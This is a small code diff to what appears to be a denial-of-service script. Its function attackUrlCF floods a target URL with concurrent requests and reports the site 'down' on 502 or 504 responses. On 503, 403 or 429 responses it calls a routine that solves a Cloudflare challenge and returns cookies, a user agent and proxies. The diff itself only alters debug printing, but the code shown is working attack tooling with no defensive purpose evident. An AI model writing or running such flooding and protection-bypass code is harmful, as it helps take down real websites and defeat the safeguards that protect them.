@@ -112,6 +112,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			isClear = True
 			for r in res:
+				print(r.content)
 				if str(r.status_code) in ['502', '504']:					
 					isClear = False
 			if isClear:
@@ -119,7 +120,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			else:
 				print('down!!!!!')
 			# print('threadNum: ' + str(threadNumber))
-			print(res)
+			# print(res)
 			if str(res[0].status_code) in ['503', '403', '429']:
 				print('resolsing chalennge')
 				cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
